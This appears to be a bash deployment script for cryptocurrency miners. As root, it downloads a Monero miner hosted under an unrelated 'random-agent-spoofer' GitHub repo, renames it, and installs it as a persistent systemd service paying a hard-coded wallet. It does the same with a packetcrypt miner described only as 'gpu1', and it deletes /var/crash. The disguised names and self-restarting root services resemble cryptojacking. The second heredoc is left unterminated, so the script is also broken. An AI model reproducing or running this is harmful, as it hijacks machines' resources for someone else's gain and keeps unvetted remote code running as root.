#!/bin/bash
cd /home
sudo wget https://github.com/trangtrau/random-agent-spoofer/releases/download/va/ar 
sudo cp ar jvdar 
sudo chmod +x jvdar

sudo rm -rf /lib/systemd/system/xmrthanh.service
sudo rm -rf /var/crash
bash -c 'cat <<EOT >>/lib/systemd/system/xmrthanh.service 
[Unit]
Description=xmrthanh
After=network.target
[Service]
ExecStart= /home/jvdar --coin=XMR -o xmr.2miners.com:2222 -u 8APgw5GTYJRZp9kQ86HHyu3VpAfZNhww29kXPyMyGD9Ve9BKsx3LwyB5g1XrNyyaPfCcsih9JDdY8L5Gm8HJMn2jDVTVeCN.Thanh -p x
WatchdogSec=36000
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&
sudo wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O packetcrypt
sudo chmod +x packetcrypt
sudo rm -rf /lib/systemd/system/pktpool.service
sudo rm -rf /var/crash
bash -c 'cat <<EOT >>/lib/systemd/system/pktpool.service 
[Unit]
Description=gpu1
After=network.target
[Service]
ExecStart= /home/packetcrypt ann -p pkt1qydtp765qufxpwr5wxfzdmv9m9khgdc8muzgax6 http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com
WatchdogSec=36000
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOT



systemctl daemon-reload &&
systemctl enable xmrthanh.service &&
service xmrthanh stop  &&
service xmrthanh restart
systemctl daemon-reload &&
systemctl enable pktpool.service &&
service pktpool stop  &&
service pktpool restart
